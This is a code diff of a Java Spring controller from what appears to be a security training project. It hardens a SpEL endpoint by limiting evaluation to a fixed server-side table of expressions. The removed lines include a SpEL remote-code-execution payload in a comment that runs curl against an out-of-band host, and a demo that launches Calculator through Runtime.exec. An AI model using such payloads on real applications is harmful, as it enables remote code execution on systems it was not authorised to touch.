@@ -1,6 +1,9 @@
 package org.joychou.controller;
 
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
 import org.springframework.expression.ConstructorResolver;
 import org.springframework.expression.EvaluationContext;
@@ -13,10 +16,8 @@ import org.springframework.expression.spel.SpelEvaluationException;
 import org.springframework.expression.spel.SpelMessage;
 import org.springframework.expression.spel.standard.SpelExpressionParser;
 import org.springframework.expression.spel.support.StandardEvaluationContext;
-import org.joychou.security.SecurityUtil;
 import org.springframework.web.util.HtmlUtils;
 import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
 
@@ -29,19 +30,34 @@ import org.springframework.web.bind.annotation.RestController;
 public class SpEL {
 
     /**
-     * SpEL to RCE
-     * http://localhost:8080/spel/vul/?expression=xxx.
-     * xxx is urlencode(exp)
-     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
+     * Server-side table of vetted expressions (literals, operators and inline collections only).
+     * The request value can only select a row; the expression that is parsed is the table's own string.
+     */
+    private static final Map<String, String> ALLOWED_EXPRESSIONS;
+
+    static {
+        Map<String, String> table = new LinkedHashMap<String, String>();
+        table.put("1+1", "1+1");
+        table.put("2*3", "2*3");
+        table.put("10-4", "10-4");
+        table.put("{1,2,3}", "{1,2,3}");
+        ALLOWED_EXPRESSIONS = Collections.unmodifiableMap(table);
+    }
+
+    /**
+     * SpEL demo: only expressions of the server-side table can be evaluated.
+     * http://localhost:8080/spel/vuln?expression=1%2B1
      */
     @GetMapping("/spel/vuln")
     public String rce(String expression) {
-        // Grammar allowlist before parsing: literals, operators, parentheses, inline collections.
-        if (!SecurityUtil.isSafeSpelExpression(expression)) {
-            return "Expression not allowed!!";
+        for (Map.Entry<String, String> entry : ALLOWED_EXPRESSIONS.entrySet()) {
+            if (entry.getKey().equals(expression)) {
+                ExpressionParser parser = new SpelExpressionParser();
+                return HtmlUtils.htmlEscape(String.valueOf(
+                        parser.parseExpression(entry.getValue()).getValue(restrictedContext())));
+            }
         }
-        ExpressionParser parser = new SpelExpressionParser();
-        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(expression).getValue(restrictedContext())));
+        return "Expression not allowed!!";
     }
 
     /**
@@ -63,12 +79,4 @@ public class SpEL {
         context.setBeanResolver(null);
         return context;
     }
-
-    public static void main(String[] args) {
-        ExpressionParser parser = new SpelExpressionParser();
-        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
-        String result = parser.parseExpression(expression).getValue().toString();
-        System.out.println(result);
-    }
 }
-
